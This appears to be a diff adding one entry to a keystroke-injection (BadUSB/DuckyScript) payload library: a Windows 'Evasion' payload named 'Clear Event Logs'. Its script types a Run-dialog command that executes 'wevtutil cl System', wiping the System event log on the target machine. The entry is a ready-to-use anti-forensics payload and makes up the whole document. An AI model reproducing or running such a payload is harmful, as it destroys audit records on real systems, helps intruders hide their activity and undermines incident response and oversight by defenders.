@@ -1,0 +1,7 @@
+{
+  "name": "Clear Event Logs",
+  "category": "Evasion",
+  "os": "Windows",
+  "description": "Clear Windows event logs",
+  "script": "REM Clear Logs\nGUI r\nDELAY 500\nSTRING cmd /c wevtutil cl System\nENTER\n"
+}
